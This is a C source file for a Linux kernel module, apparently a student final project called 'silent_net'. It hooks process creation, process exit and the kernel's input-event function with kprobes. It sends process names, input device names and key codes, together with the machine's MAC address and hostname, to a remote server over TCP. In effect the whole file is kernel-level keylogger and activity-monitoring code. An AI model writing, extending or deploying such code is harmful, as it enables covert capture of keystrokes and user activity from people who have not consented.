/*
 * This is a source code of the client side
 * Of 'silent_net' project.
 *
 * blah blah blah
 *
 *
 */

#include "kClientHook.h"
#include "headers.h"
#include "mac_find.h"
#include "protocol.h"
#include "tcp_socket.h"
#include "transmission.h"
#include "workqueue.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omer Kfir");
MODULE_DESCRIPTION("Final project");

/* Kprobes structures */
static struct kprobe kps[PROBES_SIZE] = {
    [kp_do_fork] = {.pre_handler = handler_pre_do_fork,
                    .symbol_name = HOOK_PROCESS_FORK},
    [kp_do_exit] = {.pre_handler = handler_pre_do_exit,
                    .symbol_name = HOOK_PROCESS_EXIT},
    [kp_input_event] = {.pre_handler = handler_pre_input_event,
                        .symbol_name = HOOK_INPUT_EVENT}};

/* Fork hook */
static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs) {
  char msg_buf[BUFFER_SIZE];
  size_t msg_length;

  // Check for validity and also not sending kernel process
  if (!current || !current->mm || (current->flags & PF_KTHREAD))
    return 0;

  msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPARATOR "%s",
                               MSG_PROCESS_OPEN, current->comm);
  if (msg_length > 0)
    workqueue_message(transmit_data, msg_buf, msg_length);

  return 0;
}

/* Process termination hook */
static int handler_pre_do_exit(struct kprobe *kp, struct pt_regs *regs) {
  char msg_buf[BUFFER_SIZE];
  size_t msg_length;

  // Check for validily and also not sending kernel process
  if (!current || !current->mm || (current->flags & PF_KTHREAD))
    return 0;

  msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPARATOR "%s",
                               MSG_PROCESS_CLOSE, current->comm);
  if (msg_length > 0)
    workqueue_message(transmit_data, msg_buf, msg_length);

  return 0;
}

/* Device input events */
static int handler_pre_input_event(struct kprobe *kp, struct pt_regs *regs) {
  char msg_buf[BUFFER_SIZE];
  size_t msg_length;

  struct input_dev *dev;
  unsigned int code;

  if (!regs) // Checking current is irrelevant due to interrupts
    return 0;

  dev = (struct input_dev *)regs->di; // First parameter
  code = (unsigned int)regs->dx;      // Third paramater
  if (!dev || !dev->name)
    return 0;

  msg_length = protocol_format(
      msg_buf, "%s" PROTOCOL_SEPARATOR "%s" PROTOCOL_SEPARATOR "%d",
      MSG_INPUT_EVENT, dev->name, code);

  if (msg_length > 0)
    workqueue_message(transmit_data, msg_buf, msg_length);

  return 0;
}

/* Sends mac and hostname to server */
static int handle_credentials(void) {
  char msg_buf[BUFFER_SIZE];
  size_t msg_length;

  char mac_buf[MAC_SIZE];
  get_mac_address(mac_buf);

  msg_length = protocol_format(
      msg_buf, "%s" PROTOCOL_SEPARATOR "%s" PROTOCOL_SEPARATOR "%s", MSG_AUTH,
      mac_buf, utsname()->nodename);

  if (msg_length > 0)
    workqueue_message(transmit_data, msg_buf, msg_length);

  return 0;
}

/* Register all hooks */
static int register_probes(void) {
  int ret = 0, i;

  /* Iterate through kps array of structs */
  for (i = 0; i < PROBES_SIZE; i++) {
    ret = register_kprobe(&kps[i]);

    /*
     * In case register fails unregister all
     * Probes that had been done before it
     * To ensure all probes are cleared
     */
    if (ret < 0) {
      unregister_probes(i);
      printk(KERN_ERR "Failed to register: %s\n", kps[i].symbol_name);
      return ret;
    }
  }

  printk(KERN_INFO "Finished hooking succusfully\n");
  return ret;
}

/* Unregister all kprobes */
static void unregister_probes(int max_probes) {
  /* Static char to indicate if already unregistered */
  static atomic_t unreg_kprobes =
      ATOMIC_INIT(0); // Use atomic to avoid race condition

  /* Check if it has been set to 1, if not set it to one */
  if (atomic_cmpxchg(&unreg_kprobes, 0, 1) == 0) {
    /* Create i variable
     * While it's not a good practice to
     * put it inside of a branch
     * we want to not create it if already
     * unregistered devices
     */
    int i;
    for (i = 0; i < max_probes; i++) {
      unregister_kprobe(&kps[i]);
    }
  }
}

static int __init hook_init(void) {
  int ret = 0;

  /* Initialize all main module objects */
  ret = init_singlethread_workqueue("tcp_sock_queue");
  if (ret < 0)
    return ret;

  data_transmission_init();
  handle_credentials(); // Send credentials before registering hooks

  /* Registers kprobes, if one fails unregisters all registered kprobes */
  ret = register_probes();
  if (ret < 0) {
    release_singlethread_workqueue();
    data_transmission_release();
    return ret;
  }

  printk(KERN_INFO "Finished initializing succesfully\n");
  return ret;
}

static void __exit hook_exit(void) {
  // Closing all module objects
  unregister_probes(PROBES_SIZE);

  // Only after unregistering all kprobes we can safely destroy workqueue
  release_singlethread_workqueue();
  data_transmission_release();

  printk(KERN_INFO "Unregistered kernel probes");
}

module_init(hook_init);
module_exit(hook_exit);
